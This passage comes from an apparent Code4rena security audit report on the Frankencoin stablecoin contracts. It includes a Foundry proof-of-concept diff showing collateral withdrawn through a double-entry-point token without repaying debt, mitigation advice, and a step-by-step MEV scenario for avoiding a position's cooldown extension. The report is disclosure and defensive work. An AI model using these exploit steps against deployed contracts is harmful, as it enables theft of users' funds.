class=\"mtk4\">+++ b/.gitmodules</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -1,3 +1,6 @@</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> [submodule &quot;lib/forge-std&quot;]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> \tpath = lib/forge-std</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> \turl = https://github.com/foundry-rs/forge-std</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+[submodule &quot;lib/openzeppelin-contracts&quot;]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\tpath = lib/openzeppelin-contracts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\turl = https://github.com/openzeppelin/openzeppelin-contracts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/lib/openzeppelin-contracts b/lib/openzeppelin-contracts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">new file mode 160000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 0000000..0a25c19</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- /dev/null</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/lib/openzeppelin-contracts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -0,0 +1 @@</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+Subproject commit 0a25c1940ca220686588c4af3ec526f725fe2582</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/DoubleEntryERC20.sol b/test/DoubleEntryERC20.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">new file mode 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 0000000..b871288</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- /dev/null</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/DoubleEntryERC20.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -0,0 +1,74 @@</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+pragma solidity ^0.8.0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import &quot;../lib/openzeppelin-contracts/contracts/access/Ownable.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import &quot;../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+interface DelegateERC20 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function delegateBalanceOf(address account) external view returns (uint256);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    DelegateERC20 public delegate;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    constructor() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _mint(msg.sender, 100 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function mint(address to, uint256 amount) public onlyOwner {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _mint(to, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        delegate = newContract;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function transfer(address to, uint256 value) public override returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (address(delegate) == address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            return super.transfer(to, value);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            return delegate.delegateTransfer(to, value, msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function balanceOf(address account) public view override returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (address(delegate) == address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            return super.balanceOf(account);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            return delegate.delegateBalanceOf(account);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address public delegatedFrom;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    constructor(address legacyToken) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        delegatedFrom = legacyToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _mint(msg.sender, 100 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    modifier onlyDelegateFrom() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function mint(address to, uint256 amount) public onlyOwner {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _mint(to, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function delegateTransfer(address to, uint256 value, address origSender)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        onlyDelegateFrom</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        returns (bool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _transfer(origSender, to, value);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function delegateBalanceOf(address account) public view override onlyDelegateFrom returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return balanceOf(account);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/GeneralTest.t.sol b/test/GeneralTest.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 402416d..9ce13cd 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/GeneralTest.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/GeneralTest.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -14,6 +14,7 @@ import &quot;../contracts/MintingHub.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import &quot;../contracts/PositionFactory.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import &quot;../contracts/StablecoinBridge.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import &quot;forge-std/Test.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import {LegacyToken, DoubleEntryPoint} from &quot;./DoubleEntryERC20.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract GeneralTest is Test {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -24,6 +25,8 @@ contract GeneralTest is Test {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     TestToken col;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     IFrankencoin zchf;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    LegacyToken legacy;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    DoubleEntryPoint doubleEntry;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     User alice;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     User bob;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -35,10 +38,41 @@ contract GeneralTest is Test {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         hub = new MintingHub(address(zchf), address(new PositionFactory()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         zchf.suggestMinter(address(hub), 0, 0, &quot;&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         col = new TestToken(&quot;Some Collateral&quot;, &quot;COL&quot;, uint8(0));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        legacy = new LegacyToken();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        doubleEntry = new DoubleEntryPoint(address(legacy));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         alice = new User(zchf);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bob = new User(zchf);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function testPoCWithdrawDoubleEntrypoint() public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        alice.obtainFrankencoins(swap, 1000 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit log_named_uint(&quot;alice zchf balance before opening position&quot;, zchf.balanceOf(address(alice)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 initialAmount = 100 ether;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        doubleEntry.mint(address(alice), initialAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.startPrank(address(alice));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        doubleEntry.approve(address(hub), initialAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 balanceBefore = zchf.balanceOf(address(alice));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address pos = hub.openPosition(address(doubleEntry), 100, initialAmount, 1000000 ether, 100 days, 1 days, 25000, 100 * (10 ** 36), 200000);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require((balanceBefore - hub.OPENING_FEE()) == zchf.balanceOf(address(alice)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.warp(Position(pos).cooldown() + 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        alice.mint(pos, initialAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.stopPrank();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit log_named_uint(&quot;alice zchf balance after opening position and minting&quot;, zchf.balanceOf(address(alice)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 legacyAmount = 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        legacy.mint(address(alice), legacyAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 totalAmount = initialAmount + legacyAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(address(alice));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        legacy.transfer(pos, legacyAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        legacy.delegateToNewContract(doubleEntry);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(address(alice));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        Position(pos).withdraw(address(legacy), address(alice), initialAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit log_named_uint(&quot;alice collateral balance after withdrawing collateral&quot;, doubleEntry.balanceOf(address(alice)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit log_named_uint(&quot;alice zchf balance after withdrawing collateral&quot;, zchf.balanceOf(address(alice)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;uh-oh, alice withdrew collateral without repaying zchf ://&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function initPosition() public returns (address) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         alice.obtainFrankencoins(swap, 1000 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address pos = alice.initiatePosition(col, hub);</span></span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<ul>\n<li>Manual review</li>\n<li>Foundry</li>\n</ul>\n<h3 id=\"recommended-mitigation\" style=\"position:relative;\"><a href=\"#recommended-mitigation\" aria-label=\"recommended mitigation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation</h3>\n<ul>\n<li>Validate the collateral balance has not changed after the token transfer within the call to <code>Position::withdraw</code>.</li>\n<li>Otherwise, consider restricting the use of <code>Position::withdraw</code> or remove it altogether.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/886#issuecomment-1528896542\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Excellent hint, thanks!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/886#issuecomment-1534046865\">hansfriese (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Great catch, reported with a reference URL and coded POC. Satisfactory report.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-when-the-challenge-is-successful-the-user-can-send-tokens-to-the-position-to-avoid-the-positions-cooldown-period-being-extended\" style=\"position:relative;\"><a href=\"#h-03-when-the-challenge-is-successful-the-user-can-send-tokens-to-the-position-to-avoid-the-positions-cooldown-period-being-extended\" aria-label=\"h 03 when the challenge is successful the user can send tokens to the position to avoid the positions cooldown period being extended permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/691\">[H-03] When the challenge is successful, the user can send tokens to the position to avoid the position’s cooldown period being extended</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/691\">cccz</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/156\">mahdikarimi</a></em></p>\n<p>When the challenge is successful, internalWithdrawCollateral will be called to transfer the collateral in the position. Note that the cooldown period of the position will be extended until the position expires only if the collateral in the position is less than minimumCollateral, if the user sends collateral to the position in advance, then the cool down period of the position will not be extended.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">internalWithdrawCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">collateralBalance</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">minimumCollateral</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">cooldown</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">expiration</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">emitUpdate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>I will use the following example to illustrate the severity of the issue.</p>\n<p>Consider WETH:ZCHF=2000:1, the position has a challenge period of 3 days and the minimum amount of collateral is 1 WETH.</p>\n<ol>\n<li>alice clones the position, offering 1 WETH to mint 0 zchf.</li>\n<li>alice adjusts the price to 10e8, the cooldown period is extended to 3 days later.</li>\n<li>bob offers 1 WETH to launch the challenge and charlie bids 1800 zchf.</li>\n<li>Since bob has already covered all collateral, other challengers are unprofitable and will not launch new challenges</li>\n<li>After 3 days, the cooldown period ends and the challenge expires.</li>\n<li>bob calls end() to end the challenge.</li>\n<li>alice observes bob’s transaction and uses MEV to send 1 WETH to the position in advance.</li>\n<li>bob’s transaction is executed, charlie gets the 1 WETH collateral in the position, and alice gets most of the bid.</li>\n<li>Since the position balance is still 1 WETH, the position cooldown period does not extend to the position expiration.</li>\n</ol>\n<p>10.Since the position is not cooldown and there is no challenge at this point, alice uses that price to mint 10e8 zchf.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L268-L276\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L268-L276</a> <br><a 